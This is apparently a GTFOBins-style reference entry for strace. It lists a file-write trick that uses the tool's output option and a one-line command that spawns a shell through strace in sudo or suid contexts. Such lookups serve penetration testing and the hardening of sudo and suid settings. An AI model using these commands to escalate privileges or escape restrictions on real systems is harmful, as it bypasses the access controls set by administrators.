title: strace
html:
strace

File Write

Context: sudo, unprivileged

strace -s 999 -o /path/to/output-file strace - DATA

Shell

Context: sudo, suid, unprivileged

strace -o /dev/null /bin/sh
excerpt: strace File Write Context: sudo, unprivileged strace -s 999 -o /path/to/output-file strace - DATA Shell Context: sudo, suid, unprivileged strace -o /dev/null /bin/sh
